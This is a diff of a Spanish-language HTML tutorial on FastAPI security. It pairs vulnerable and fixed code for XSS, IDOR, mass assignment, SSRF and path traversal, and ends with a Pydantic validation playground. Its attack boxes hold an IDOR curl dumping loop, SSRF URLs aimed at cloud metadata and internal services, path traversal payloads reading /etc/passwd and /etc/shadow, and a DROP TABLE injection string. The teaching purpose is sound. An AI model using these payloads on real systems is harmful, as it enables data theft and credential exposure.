+        <p>El robo de tokens v&#237;a XSS es la forma m&#225;s com&#250;n de account takeover. Con el access_token, el atacante se autentica como esa persona indefinidamente.</p>
+        <div class="defense-note">&#10003; Defensa: API JSON nunca renderiza HTML. Content-Security-Policy header. X-Content-Type-Options: nosniff. Sanitizar con bleach si aceptas HTML del usuario.</div>
       </div>
       <div class="vuln-code-col">
-        <div class="code-block-sm cb-bad">
-          <span class="cb-label lbl-bad">❌ VULNERABLE — reflejo sin escapar</span>
-<span class="cm"># Un endpoint que devuelve HTML dinámico</span>
-<span class="dec">@router.get</span>(<span class="str">"/profile/{name}"</span>)
-<span class="kw">async def</span> <span class="fn">profile_page</span>(name: <span class="cls">str</span>):
-    <span class="kw">return</span> HTMLResponse(
-        <span class="vl">f"&lt;h1&gt;Perfil de {name}&lt;/h1&gt;"</span>
-    )  <span class="cm"># name = "&lt;script&gt;...&lt;/script&gt;" → ejecuta</span>
+        <div class="cblock cb-bad">
+          <span class="cb-label lbl-bad">&#10007; VULNERABLE &#8212; reflejo sin escapar</span>
+          <pre><span class="dec">@router.get</span>(<span class="str">"/profile/{name}"</span>)
+<span class="kw">async def</span> <span class="fn">profile</span>(name: <span class="cls">str</span>):
+<span class="vl">    return HTMLResponse(
+        f"&lt;h1&gt;Perfil de {name}&lt;/h1&gt;"
+    )  # name = "&lt;script&gt;...&lt;/script&gt;"</span>
 
-<span class="cm"># Si tu API guarda y sirve contenido del usuario:</span>
-<span class="vl">bio = user_input  # sin sanitizar</span>
-<span class="vl">return {"bio": bio}  # el frontend lo renderiza: XSS stored</span>
+<span class="cm"># Stored XSS: guardar sin sanitizar</span>
+<span class="vl">bio = user_input  # sin sanitizar
+return {"bio": bio}  # frontend lo renderiza</span></pre>
         </div>
-        <div class="code-block-sm cb-good">
-          <span class="cb-label lbl-good">✓ SEGURO — JSON + sanitización</span>
-<span class="cm"># pip install bleach</span>
+        <div class="cblock cb-good">
+          <span class="cb-label lbl-good">&#10003; SEGURO &#8212; sanitizaci&#243;n con bleach</span>
+          <pre><span class="cm"># pip install bleach</span>
 <span class="kw">import</span> bleach
 
 ALLOWED_TAGS = [<span class="str">"b"</span>, <span class="str">"i"</span>, <span class="str">"em"</span>, <span class="str">"strong"</span>]
@@ -502,13 +478,12 @@ ALLOWED_TAGS = [<span class="str">"b"</span>, <span class="str">"i"</span>, <spa
 
     <span class="dec">@field_validator</span>(<span class="str">"bio"</span>)
     <span class="dec">@classmethod</span>
-    <span class="kw">def</span> <span class="fn">sanitize_bio</span>(cls, v: <span class="cls">str</span>) -> <span class="cls">str</span>:
-        <span class="cm"># bleach elimina tags no permitidas y atributos</span>
-        <span class="kw">return</span> bleach.<span class="fn">clean</span>(v, tags=ALLOWED_TAGS, strip=<span class="kw">True</span>)
-
-<span class="cm"># Headers que previenen XSS en el navegador:</span>
-<span class="cm"># Content-Security-Policy: default-src 'self'</span>
-<span class="cm"># X-Content-Type-Options: nosniff</span>
+    <span class="kw">def</span> <span class="fn">sanitize_bio</span>(cls, v):
+        <span class="kw">return</span> bleach.<span class="fn">clean</span>(
+            v, tags=ALLOWED_TAGS, strip=<span class="kw">True</span>
+        )
+<span class="cm"># Header que bloquea XSS en navegador:
+# Content-Security-Policy: default-src 'self'</span></pre>
         </div>
       </div>
     </div>
@@ -516,53 +491,47 @@ ALLOWED_TAGS = [<span class="str">"b"</span>, <span class="str">"i"</span>, <spa
     <!-- IDOR -->
     <div class="vuln-pane" id="vtab-idor">
       <div class="vuln-theory">
-        <h3>IDOR — Insecure Direct Object Reference</h3>
-        <p>El endpoint recibe un ID directamente del usuario y lo usa sin verificar que ese usuario tiene derecho a ese objeto. El atacante itera IDs secuenciales y extrae datos de todos.</p>
-        <div class="attack-payload">
-          <span class="payload-label">Ataque IDOR — script bash</span>
-          for i in $(seq 1 10000); do<br>
-          &nbsp;&nbsp;curl -H "Auth: Bearer $MY_TOKEN" \<br>
-          &nbsp;&nbsp;&nbsp;&nbsp;/api/v1/orders/$i >> dump.json<br>
-          done<br>
-          # extrae 10,000 órdenes de otros usuarios
-        </div>
-        <p>IDOR es la vulnerabilidad más reportada en bug bounty. Es fácil de explotar, devastadora para la privacidad, y muy fácil de prevenir con un check de propiedad.</p>
-        <div style="margin-top:1rem;padding:0.8rem 1rem;background:rgba(6,214,160,0.04);border:1px solid rgba(6,214,160,0.1);font-family:var(--mono);font-size:0.68rem;color:var(--green);line-height:1.7">
-          ✓ Defensa: verify_ownership() en cada endpoint. Usar UUIDs en lugar de IDs secuenciales. Test explícito de IDOR en pytest (Cap.04).
-        </div>
+        <h3>IDOR &#8212; Insecure Direct Object Reference</h3>
+        <p>El endpoint recibe un ID del usuario y lo usa sin verificar que tiene derecho a ese objeto. El atacante itera IDs secuenciales y extrae datos de todos los usuarios.</p>
+        <div class="attack-payload"><span class="payload-label">Script de ataque IDOR</span>for i in $(seq 1 10000); do
+  curl -H "Authorization: Bearer $MY_TOKEN" \
+    /api/v1/orders/$i >> dump.json
+done
+# extrae 10,000 &#243;rdenes de otros usuarios</div>
+        <p>IDOR es la vulnerabilidad m&#225;s reportada en bug bounty. Es f&#225;cil de explotar, devastadora para la privacidad, y muy f&#225;cil de prevenir con un check de propiedad.</p>
+        <div class="defense-note">&#10003; Defensa: verify_ownership() en cada endpoint. Usar UUIDs en lugar de IDs secuenciales. Test expl&#237;cito de IDOR en pytest.</div>
       </div>
       <div class="vuln-code-col">
-        <div class="code-block-sm cb-bad">
-          <span class="cb-label lbl-bad">❌ VULNERABLE — sin verificación</span>
-<span class="dec">@router.get</span>(<span class="str">"/orders/{order_id}"</span>)
-<span class="kw">async def</span> <span class="fn">get_order</span>(order_id: <span class="cls">int</span>, db=<span class="fn">Depends</span>(get_db)):
-    <span class="vl">order = await db.get(Order, order_id)</span>
-    <span class="vl">if not order:</span>
-    <span class="vl">    raise HTTPException(404)</span>
-    <span class="vl">return order  # cualquier usuario ve cualquier orden</span>
-        </div>
-        <div class="code-block-sm cb-good">
-          <span class="cb-label lbl-good">✓ SEGURO — ownership verificado</span>
-<span class="cm"># app/services/base.py — patrón reutilizable</span>
-<span class="kw">async def</span> <span class="fn">verify_ownership</span>(
-    resource, current_user, allow_admin=<span class="kw">True</span>
+        <div class="cblock cb-bad">
+          <span class="cb-label lbl-bad">&#10007; VULNERABLE &#8212; sin verificaci&#243;n</span>
+          <pre><span class="dec">@router.get</span>(<span class="str">"/orders/{order_id}"</span>)
+<span class="kw">async def</span> <span class="fn">get_order</span>(
+    order_id: <span class="cls">int</span>, db=<span class="fn">Depends</span>(get_db)
 ):
+<span class="vl">    order = await db.get(Order, order_id)
+    if not order:
+        raise HTTPException(404)
+    return order  # cualquier usuario ve todo</span></pre>
+        </div>
+        <div class="cblock cb-good">
+          <span class="cb-label lbl-good">&#10003; SEGURO &#8212; ownership verificado</span>
+          <pre><span class="kw">async def</span> <span class="fn">verify_ownership</span>(resource, user):
     <span class="kw">if not</span> resource:
         <span class="kw">raise</span> <span class="fn">HTTPException</span>(<span class="num">404</span>)
-    is_owner = resource.user_id == current_user.id
-    is_admin = allow_admin <span class="kw">and</span> current_user.is_admin
+    is_owner = resource.user_id == user.id
+    is_admin = user.is_admin
     <span class="kw">if not</span> (is_owner <span class="kw">or</span> is_admin):
-        <span class="kw">raise</span> <span class="fn">HTTPException</span>(<span class="num">403</span>, <span class="str">"Acceso denegado"</span>)
+        <span class="kw">raise</span> <span class="fn">HTTPException</span>(<span class="num">403</span>,<span class="str">"Acceso denegado"</span>)
     <span class="kw">return</span> resource
 
 <span class="dec">@router.get</span>(<span class="str">"/orders/{order_id}"</span>)
 <span class="kw">async def</span> <span class="fn">get_order</span>(
     order_id: <span class="cls">int</span>,
-    current_user=<span class="fn">Depends</span>(get_current_user),
+    user=<span class="fn">Depends</span>(get_current_user),
     db=<span class="fn">Depends</span>(get_db),
 ):
     order = <span class="kw">await</span> db.<span class="fn">get</span>(Order, order_id)
-    <span class="kw">return await</span> <span class="fn">verify_ownership</span>(order, current_user)
+    <span class="kw">return await</span> <span class="fn">verify_ownership</span>(order, user)</pre>
         </div>
       </div>
     </div>
@@ -571,50 +540,42 @@ ALLOWED_TAGS = [<span class="str">"b"</span>, <span class="str">"i"</span>, <spa
     <div class="vuln-pane" id="vtab-mass">
       <div class="vuln-theory">
         <h3>Mass Assignment</h3>
-        <p>El usuario envía campos extra en el JSON body que no deberían ser modificables — como <code style="color:var(--orange)">is_admin: true</code>, <code style="color:var(--orange)">role: "superuser"</code>, o <code style="color:var(--orange)">credits: 999999</code>. Si el ORM acepta todo el dict sin filtrar, el atacante escala privilegios instantáneamente.</p>
-        <div class="attack-payload">
-          <span class="payload-label">Body del atacante al registrar</span>
-          {"username": "hacker", "email": "h@x.com",<br>
-          &nbsp;"password": "pass", "is_admin": true,<br>
-          &nbsp;"credits": 99999, "role": "superuser"}
-        </div>
+        <p>El usuario env&#237;a campos extra en el JSON body que no deber&#237;an ser modificables &#8212; como <code style="color:var(--orange)">is_admin: true</code> o <code style="color:var(--orange)">credits: 999999</code>. Si el ORM acepta todo sin filtrar, el atacante escala privilegios instant&#225;neamente.</p>
+        <div class="attack-payload"><span class="payload-label">Body del atacante al registrar</span>{"username": "hacker", "email": "h@x.com",
+ "password": "pass", "is_admin": true,
+ "credits": 99999, "role": "superuser"}</div>
         <p>Pydantic previene esto si defines schemas estrictos. El error es usar el modelo ORM directamente como schema de entrada.</p>
-        <div style="margin-top:1rem;padding:0.8rem 1rem;background:rgba(6,214,160,0.04);border:1px solid rgba(6,214,160,0.1);font-family:var(--mono);font-size:0.68rem;color:var(--green);line-height:1.7">
-          ✓ Defensa: schemas separados para input (UserCreate) y output (UserResponse). Nunca aceptar el modelo ORM completo como input. model_fields_set en PATCH.
-        </div>
+        <div class="defense-note">&#10003; Defensa: schemas separados para input (UserCreate) y output (UserResponse). Nunca aceptar el modelo ORM completo como input. model_dump(exclude_unset=True) en PATCH.</div>
       </div>
       <div class="vuln-code-col">
-        <div class="code-block-sm cb-bad">
-          <span class="cb-label lbl-bad">❌ VULNERABLE — sin schema</span>
-<span class="dec">@router.post</span>(<span class="str">"/users"</span>)
-<span class="kw">async def</span> <span class="fn">create_user</span>(body: <span class="cls">dict</span>, db=<span class="fn">Depends</span>(get_db)):
-    <span class="vl">user = User(**body)  # acepta cualquier campo del body</span>
-    <span class="vl">db.add(user)         # is_admin=True se guarda</span>
+        <div class="cblock cb-bad">
+          <span class="cb-label lbl-bad">&#10007; VULNERABLE &#8212; sin schema</span>
+          <pre><span class="dec">@router.post</span>(<span class="str">"/users"</span>)
+<span class="kw">async def</span> <span class="fn">create_user</span>(body: <span class="cls">dict</span>, db=...):
+<span class="vl">    user = User(**body)  # acepta cualquier campo
+    db.add(user)         # is_admin=True se guarda!</span>
     <span class="kw">return</span> user
 
-<span class="cm"># También peligroso — devolver el ORM completo:</span>
-<span class="vl">return user.__dict__  # incluye hashed_password!</span>
+<span class="cm"># Tambi&#233;n peligroso:</span>
+<span class="vl">return user.__dict__  # incluye hashed_password!</span></pre>
         </div>
-        <div class="code-block-sm cb-good">
-          <span class="cb-label lbl-good">✓ SEGURO — schemas estrictos</span>
-<span class="cm"># Input: solo los campos que el usuario puede enviar</span>
-<span class="kw">class</span> <span class="cls">UserCreate</span>(BaseModel):
+        <div class="cblock cb-good">
+          <span class="cb-label lbl-good">&#10003; SEGURO &#8212; schemas estrictos</span>
+          <pre><span class="kw">class</span> <span class="cls">UserCreate</span>(BaseModel):
     email: EmailStr
-    username: <span class="cls">str</span> = <span class="fn">Field</span>(min_length=<span class="num">3</span>, max_length=<span class="num">50</span>)
+    username: <span class="cls">str</span> = <span class="fn">Field</span>(min_length=<span class="num">3</span>,max_length=<span class="num">50</span>)
     password: <span class="cls">str</span> = <span class="fn">Field</span>(min_length=<span class="num">8</span>)
-    <span class="cm"># is_admin NO está aquí → no puede enviarlo</span>
+    <span class="cm"># is_admin NO est&#225; &#8594; no puede enviarlo</span>
 
-<span class="cm"># Output: solo lo que el cliente necesita ver</span>
 <span class="kw">class</span> <span class="cls">UserResponse</span>(BaseModel):
     id: <span class="cls">int</span>; email: <span class="cls">str</span>; username: <span class="cls">str</span>
-    <span class="cm"># hashed_password, is_admin NO están aquí</span>
+    <span class="cm"># hashed_password NO est&#225; &#8594; nunca se expone</span>
     model_config = {<span class="str">"from_attributes"</span>: <span class="kw">True</span>}
 
-<span class="cm"># PATCH seguro — solo actualiza campos enviados</span>
-<span class="dec">@router.patch</span>(<span class="str">"/users/me"</span>, response_model=UserResponse)
+<span class="dec">@router.patch</span>(<span class="str">"/users/me"</span>,response_model=UserResponse)
 <span class="kw">async def</span> <span class="fn">update_me</span>(body: UserUpdate, ...):
     data = body.<span class="fn">model_dump</span>(exclude_unset=<span class="kw">True</span>)
-    <span class="kw">for</span> k, v <span class="kw">in</span> data.<span class="fn">items</span>(): <span class="fn">setattr</span>(user, k, v)
+    <span class="kw">for</span> k, v <span class="kw">in</span> data.<span class="fn">items</span>(): <span class="fn">setattr</span>(user,k,v)</pre>
         </div>
       </div>
     </div>
@@ -623,51 +584,45 @@ ALLOWED_TAGS = [<span class="str">"b"</span>, <span class="str">"i"</span>, <spa
     <div class="vuln-pane" id="vtab-ssrf">
       <div class="vuln-theory">
         <h3>Server-Side Request Forgery</h3>
-        <p>Tu servidor hace requests HTTP a URLs que controla el atacante. En un entorno cloud (AWS, GCP, Azure), la URL <code style="color:var(--orange)">http://169.254.169.254/latest/meta-data/</code> devuelve credenciales IAM del servidor. Con esas credenciales, el atacante tiene acceso completo a tu infraestructura.</p>
-        <div class="attack-payload">
-          <span class="payload-label">URLs que el atacante podría inyectar</span>
-          http://169.254.169.254/latest/meta-data/iam/   ← AWS metadata<br>
-          http://metadata.google.internal/computeMetadata/v1/<br>
-          http://localhost:5432/  ← tu PostgreSQL interno<br>
-          http://redis:6379/      ← tu Redis interno<br>
-          file:///etc/passwd      ← archivos del sistema
-        </div>
-        <p>SSRF convierte tu servidor en un proxy para atacar servicios internos que de otro modo serían inaccesibles desde internet.</p>
-        <div style="margin-top:1rem;padding:0.8rem 1rem;background:rgba(6,214,160,0.04);border:1px solid rgba(6,214,160,0.1);font-family:var(--mono);font-size:0.68rem;color:var(--green);line-height:1.7">
-          ✓ Defensa: allowlist de dominios permitidos. Nunca hacer requests a URLs proporcionadas por el usuario sin validación estricta. Bloquear IPs privadas y localhost.
-        </div>
+        <p>Tu servidor hace requests HTTP a URLs que controla el atacante. En AWS, la URL <code style="color:var(--orange)">http://169.254.169.254/latest/meta-data/iam/</code> devuelve credenciales IAM del servidor. Con esas credenciales, acceso total a tu infraestructura.</p>
+        <div class="attack-payload"><span class="payload-label">URLs que el atacante puede inyectar</span>http://169.254.169.254/latest/meta-data/iam/
+http://metadata.google.internal/computeMetadata/v1/
+http://localhost:5432/  &#8592; tu PostgreSQL interno
+http://redis:6379/      &#8592; tu Redis interno
+file:///etc/passwd      &#8592; archivos del sistema</div>
+        <p>SSRF convierte tu servidor en un proxy para atacar servicios internos inaccesibles desde internet.</p>
+        <div class="defense-note">&#10003; Defensa: allowlist de dominios permitidos. Bloquear IPs privadas (169.254.x.x, 10.x.x.x, 172.16.x.x, 192.168.x.x) y localhost. Nunca fetch a URLs del usuario sin validar.</div>
       </div>
       <div class="vuln-code-col">
-        <div class="code-block-sm cb-bad">
-          <span class="cb-label lbl-bad">❌ VULNERABLE — URL sin validar</span>
-<span class="dec">@router.post</span>(<span class="str">"/fetch-preview"</span>)
-<span class="kw">async def</span> <span class="fn">fetch_url_preview</span>(url: <span class="cls">str</span>):
-    <span class="kw">async with</span> httpx.<span class="fn">AsyncClient</span>() <span class="kw">as</span> client:
-        <span class="vl">resp = await client.get(url)  # ← SSRF total</span>
-    <span class="kw">return</span> {<span class="str">"content"</span>: resp.text}
-<span class="cm"># url = "http://169.254.169.254/latest/meta-data/"</span>
-<span class="cm"># → devuelve credenciales AWS del servidor</span>
+        <div class="cblock cb-bad">
+          <span class="cb-label lbl-bad">&#10007; VULNERABLE &#8212; URL sin validar</span>
+          <pre><span class="dec">@router.post</span>(<span class="str">"/fetch-preview"</span>)
+<span class="kw">async def</span> <span class="fn">fetch_preview</span>(url: <span class="cls">str</span>):
+<span class="vl">    async with httpx.AsyncClient() as c:
+        resp = await c.get(url)  # &#8592; SSRF total
+    return {"content": resp.text}
+# url = "http://169.254.169.254/..."
+# &#8594; devuelve credenciales AWS del servidor</span></pre>
         </div>
-        <div class="code-block-sm cb-good">
-          <span class="cb-label lbl-good">✓ SEGURO — validación estricta</span>
-<span class="kw">import</span> ipaddress
+        <div class="cblock cb-good">
+          <span class="cb-label lbl-good">&#10003; SEGURO &#8212; validaci&#243;n estricta</span>
+          <pre><span class="kw">import</span> ipaddress
 <span class="kw">from</span> urllib.parse <span class="kw">import</span> urlparse
 
-ALLOWED_DOMAINS = {<span class="str">"example.com"</span>, <span class="str">"api.trusted.com"</span>}
+ALLOWED = {<span class="str">"example.com"</span>, <span class="str">"api.trusted.com"</span>}
 
-<span class="kw">def</span> <span class="fn">validate_url_safe</span>(url: <span class="cls">str</span>) -> <span class="cls">str</span>:
-    parsed = <span class="fn">urlparse</span>(url)
-    <span class="kw">if</span> parsed.scheme <span class="kw">not in</span> (<span class="str">"http"</span>, <span class="str">"https"</span>):
+<span class="kw">def</span> <span class="fn">validate_url</span>(url: <span class="cls">str</span>) -> <span class="cls">str</span>:
+    p = <span class="fn">urlparse</span>(url)
+    <span class="kw">if</span> p.scheme <span class="kw">not in</span> (<span class="str">"http"</span>,<span class="str">"https"</span>):
         <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"Solo HTTP/HTTPS"</span>)
-    <span class="kw">if</span> parsed.hostname <span class="kw">not in</span> ALLOWED_DOMAINS:
+    <span class="kw">if</span> p.hostname <span class="kw">not in</span> ALLOWED:
         <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"Dominio no permitido"</span>)
-    <span class="cm"># Bloquear IPs privadas</span>
     <span class="kw">try</span>:
-        ip = ipaddress.<span class="fn">ip_address</span>(parsed.hostname)
+        ip = ipaddress.<span class="fn">ip_address</span>(p.hostname)
         <span class="kw">if</span> ip.is_private <span class="kw">or</span> ip.is_loopback:
-            <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"IP privada bloqueada"</span>)
+            <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"IP privada"</span>)
     <span class="kw">except</span> ValueError: <span class="kw">pass</span>
-    <span class="kw">return</span> url
+    <span class="kw">return</span> url</pre>
         </div>
       </div>
     </div>
@@ -676,809 +631,679 @@ ALLOWED_DOMAINS = {<span class="str">"example.com"</span>, <span class="str">"ap
     <div class="vuln-pane" id="vtab-pt">
       <div class="vuln-theory">
         <h3>Path Traversal</h3>
-        <p>El atacante usa <code style="color:var(--orange)">../</code> en nombres de archivo para navegar fuera del directorio permitido y leer archivos del sistema operativo como <code style="color:var(--orange)">/etc/passwd</code>, <code style="color:var(--orange)">/etc/shadow</code>, o tus propios archivos de configuración con secrets.</p>
-        <div class="attack-payload">
-          <span class="payload-label">Payloads de Path Traversal</span>
-          GET /api/v1/files/download?name=../../../etc/passwd<br>
-          GET /api/v1/files/../../../app/core/config.py<br>
-          name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow<br>
-          name=....//....//etc/passwd  (bypass de filtros simples)
-        </div>
-        <p>Particularmente peligroso en endpoints de descarga de archivos. Si tienes un sistema de avatares o documentos, este es el primer vector a cerrar.</p>
-        <div style="margin-top:1rem;padding:0.8rem 1rem;background:rgba(6,214,160,0.04);border:1px solid rgba(6,214,160,0.1);font-family:var(--mono);font-size:0.68rem;color:var(--green);line-height:1.7">
-          ✓ Defensa: pathlib.Path.resolve() + verificar que el path final está dentro del directorio base. Nunca confiar en nombres de archivo del usuario.
-        </div>
+        <p>El atacante usa <code style="color:var(--orange)">../</code> en nombres de archivo para navegar fuera del directorio permitido y leer archivos del sistema como <code style="color:var(--orange)">/etc/passwd</code> o tus propios archivos de configuraci&#243;n con secrets.</p>
+        <div class="attack-payload"><span class="payload-label">Payloads de Path Traversal</span>GET /api/v1/files?name=../../../etc/passwd
+GET /api/v1/files?name=....//....//etc/shadow
+name=%2e%2e%2f%2e%2e%2fetc%2fpasswd  (URL encoded)
+name=../app/core/config.py  &#8592; tus secrets</div>
+        <p>Especialmente peligroso en endpoints de descarga. Si tienes avatares o documentos, este es el primer vector a cerrar.</p>
+        <div class="defense-note">&#10003; Defensa: pathlib.Path.resolve() + verificar que el path final est&#225; dentro del directorio base. Nunca confiar en nombres de archivo del usuario. Siempre renombrar con UUID.</div>
       </div>
       <div class="vuln-code-col">
-        <div class="code-block-sm cb-bad">
-          <span class="cb-label lbl-bad">❌ VULNERABLE — path directo</span>
-<span class="dec">@router.get</span>(<span class="str">"/files/download"</span>)
-<span class="kw">async def</span> <span class="fn">download_file</span>(filename: <span class="cls">str</span>):
-    <span class="vl">path = f"/uploads/{filename}"</span>
-    <span class="kw">return</span> <span class="fn">FileResponse</span>(path)
-<span class="cm"># filename = "../../../etc/passwd"</span>
-<span class="cm"># path = "/uploads/../../../etc/passwd" = "/etc/passwd"</span>
+        <div class="cblock cb-bad">
+          <span class="cb-label lbl-bad">&#10007; VULNERABLE &#8212; path directo</span>
+          <pre><span class="dec">@router.get</span>(<span class="str">"/files/download"</span>)
+<span class="kw">async def</span> <span class="fn">download</span>(filename: <span class="cls">str</span>):
+<span class="vl">    path = f"/uploads/{filename}"
+    return FileResponse(path)
+# filename = "../../../etc/passwd"
+# path real = "/etc/passwd" &#8592; expuesto</span></pre>
         </div>
-        <div class="code-block-sm cb-good">
-          <span class="cb-label lbl-good">✓ SEGURO — path confinado</span>
-<span class="kw">from</span> pathlib <span class="kw">import</span> Path
+        <div class="cblock cb-good">
+          <span class="cb-label lbl-good">&#10003; SEGURO &#8212; path confinado</span>
+          <pre><span class="kw">from</span> pathlib <span class="kw">import</span> Path
 
 UPLOAD_DIR = Path(<span class="str">"/app/uploads"</span>).<span class="fn">resolve</span>()
 
 <span class="kw">def</span> <span class="fn">safe_path</span>(filename: <span class="cls">str</span>) -> Path:
-    <span class="cm"># resolve() normaliza ../.. y symlinks</span>
     candidate = (UPLOAD_DIR / filename).<span class="fn">resolve</span>()
-    <span class="cm"># Verificar que sigue dentro del directorio permitido</span>
     <span class="kw">if not</span> <span class="fn">str</span>(candidate).<span class="fn">startswith</span>(<span class="fn">str</span>(UPLOAD_DIR)):
-        <span class="kw">raise</span> <span class="fn">HTTPException</span>(<span class="num">400</span>, <span class="str">"Ruta no permitida"</span>)
+        <span class="kw">raise</span> <span class="fn">HTTPException</span>(<span class="num">400</span>,<span class="str">"Ruta no permitida"</span>)
     <span class="kw">if not</span> candidate.<span class="fn">exists</span>():
         <span class="kw">raise</span> <span class="fn">HTTPException</span>(<span class="num">404</span>)
     <span class="kw">return</span> candidate
 
 <span class="dec">@router.get</span>(<span class="str">"/files/download"</span>)
-<span class="kw">async def</span> <span class="fn">download_file</span>(filename: <span class="cls">str</span>):
-    <span class="kw">return</span> <span class="fn">FileResponse</span>(<span class="fn">safe_path</span>(filename))
+<span class="kw">async def</span> <span class="fn">download</span>(filename: <span class="cls">str</span>):
+    <span class="kw">return</span> <span class="fn">FileResponse</span>(<span class="fn">safe_path</span>(filename))</pre>
         </div>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ════ INPUT VALIDATION PLAYGROUND ════ -->
+<!-- INPUT VALIDATION PLAYGROUND -->
 <section class="section" id="inputs" style="background:linear-gradient(to bottom,transparent,rgba(255,107,26,0.01),transparent)">
   <div class="section-inner">
-    <p class="sec-label fade-in">// sección 03 — validación interactiva</p>
-    <h2 class="sec-h2 fade-in">Pydantic como<br><em>primera línea</em> de defensa</h2>
-    <p class="sec-sub fade-in">Prueba inputs maliciosos. La versión insegura los acepta. La segura los rechaza antes de llegar a la base de datos.</p>
-
+    <p class="sec-label fade-in">// secci&#243;n 03 &#8212; validaci&#243;n interactiva</p>
+    <h2 class="sec-h2 fade-in">Pydantic como<br><em>primera l&#237;nea</em> de defensa</h2>
+    <p class="sec-sub fade-in">Prueba inputs maliciosos. La versi&#243;n insegura los acepta. La segura los rechaza antes de llegar a la base de datos.</p>
     <div class="playground-wrap fade-in">
       <div class="pg-panel">
-        <div class="pg-head">
-          <span class="pg-badge-bad">✗ Sin validación</span>
-          Acepta cualquier input
-        </div>
+        <div class="pg-head"><span class="pg-badge-bad">&#10007; Sin validaci&#243;n</span> Acepta cualquier input</div>
         <div class="pg-body">
-          <label class="pg-label">Email (sin validar)</label>
-          <input class="pg-input unsafe" id="unsafe-email" type="text" value="no-es-un-email" oninput="testUnsafe()">
-          <div class="pg-result danger" id="unsafe-email-result">→ Pasa al ORM tal cual</div>
-
-          <label class="pg-label">Username (sin validar)</label>
-          <input class="pg-input unsafe" id="unsafe-user" type="text" value="'; DROP TABLE users;--" oninput="testUnsafe()">
-          <div class="pg-result danger" id="unsafe-user-result">→ Pasa al ORM tal cual</div>
-
-          <label class="pg-label">Age (sin validar)</label>
-          <input class="pg-input unsafe" id="unsafe-age" type="text" value="-999" oninput="testUnsafe()">
-          <div class="pg-result danger" id="unsafe-age-result">→ Pasa al ORM tal cual</div>
+          <label class="pg-lbl">Email (sin validar)</label>
+          <input class="pg-input unsafe" id="unsafe-email" value="no-es-un-email" oninput="testUnsafe()">
+          <div class="pg-result danger" id="r-ue">&#8594; Pasa al ORM tal cual</div>
+          <label class="pg-lbl">Username (sin validar)</label>
+          <input class="pg-input unsafe" id="unsafe-user" value="'; DROP TABLE users;--" oninput="testUnsafe()">
+          <div class="pg-result danger" id="r-uu">&#8594; Pasa al ORM tal cual</div>
+          <label class="pg-lbl">Age (sin validar)</label>
+          <input class="pg-input unsafe" id="unsafe-age" value="-999" oninput="testUnsafe()">
+          <div class="pg-result danger" id="r-ua">&#8594; Pasa al ORM tal cual</div>
         </div>
       </div>
-
       <div class="pg-panel">
-        <div class="pg-head">
-          <span class="pg-badge-good">✓ Con Pydantic</span>
-          Validación estricta
-        </div>
+        <div class="pg-head"><span class="pg-badge-good">&#10003; Con Pydantic</span> Validaci&#243;n estricta</div>
         <div class="pg-body">
-          <label class="pg-label">Email (validado)</label>
-          <input class="pg-input safe" id="safe-email" type="text" value="no-es-un-email" oninput="testSafe()">
-          <div class="pg-result warn" id="safe-email-result">Calculando...</div>
-
-          <label class="pg-label">Username (validado · solo a-z 0-9 _ -)</label>
-          <input class="pg-input safe" id="safe-user" type="text" value="'; DROP TABLE users;--" oninput="testSafe()">
-          <div class="pg-result warn" id="safe-user-result">Calculando...</div>
-
-          <label class="pg-label">Age (validado · 1-120)</label>
-          <input class="pg-input safe" id="safe-age" type="text" value="-999" oninput="testSafe()">
-          <div class="pg-result warn" id="safe-age-result">Calculando...</div>
+          <label class="pg-lbl">Email (validado &#183; RFC 5322)</label>
+          <input class="pg-input safe" id="safe-email" value="no-es-un-email" oninput="testSafe()">
+          <div class="pg-result" id="r-se">Calculando...</div>
+          <label class="pg-lbl">Username (validado &#183; solo a-z 0-9 _ -)</label>
+          <input class="pg-input safe" id="safe-user" value="'; DROP TABLE users;--" oninput="testSafe()">
+          <div class="pg-result" id="r-su">Calculando...</div>
+          <label class="pg-lbl">Age (validado &#183; 1&#8211;120)</label>
+          <input class="pg-input safe" id="safe-age" value="-999" oninput="testSafe()">
+          <div class="pg-result" id="r-sa">Calculando...</div>
         </div>
       </div>
     </div>
-
-    <!-- Pydantic validators -->
-    <div style="margin-top:3rem" class="fade-in">
-      <div class="code-block-sm cb-good" style="border-top:1px solid rgba(6,214,160,0.12)">
-        <span class="cb-label lbl-good">✓ El schema Pydantic que hace todo esto</span>
-<span class="kw">from</span> pydantic <span class="kw">import</span> BaseModel, EmailStr, Field, field_validator, model_validator
+    <!-- Code underneath -->
+    <div style="margin-top:2rem" class="fade-in">
+      <div class="cblock cb-good" style="border-top:1px solid rgba(6,214,160,0.12)">
+        <span class="cb-label lbl-good">&#10003; Schema Pydantic que implementa todas estas validaciones</span>
+        <pre><span class="kw">from</span> pydantic <span class="kw">import</span> BaseModel, EmailStr, Field, field_validator
 <span class="kw">import</span> re
 
 <span class="kw">class</span> <span class="cls">UserCreate</span>(BaseModel):
-    email: EmailStr                          <span class="cm"># valida RFC 5322</span>
+    email: EmailStr                           <span class="cm"># valida RFC 5322</span>
     username: <span class="cls">str</span> = <span class="fn">Field</span>(
         min_length=<span class="num">3</span>, max_length=<span class="num">50</span>,
-        pattern=<span class="str">r"^[a-zA-Z0-9_-]+$"</span>         <span class="cm"># solo chars seguros</span>
+        pattern=<span class="str">r"^[a-zA-Z0-9_-]+$"</span>          <span class="cm"># solo chars seguros</span>
     )
-    age: <span class="cls">int</span> = <span class="fn">Field</span>(ge=<span class="num">1</span>, le=<span class="num">120</span>)          <span class="cm"># ge=≥1, le=≤120</span>
+    age: <span class="cls">int</span> = <span class="fn">Field</span>(ge=<span class="num">1</span>, le=<span class="num">120</span>)           <span class="cm"># ge=&#8805;1, le=&#8804;120</span>
     password: <span class="cls">str</span> = <span class="fn">Field</span>(min_length=<span class="num">8</span>, max_length=<span class="num">128</span>)
-    bio: <span class="cls">str</span> | <span class="kw">None</span> = <span class="fn">Field</span>(<span class="kw">None</span>, max_length=<span class="num">500</span>)
-
-    <span class="dec">@field_validator</span>(<span class="str">"username"</span>)
-    <span class="dec">@classmethod</span>
-    <span class="kw">def</span> <span class="fn">username_not_reserved</span>(cls, v: <span class="cls">str</span>) -> <span class="cls">str</span>:
-        reserved = {<span class="str">"admin"</span>, <span class="str">"root"</span>, <span class="str">"system"</span>, <span class="str">"api"</span>}
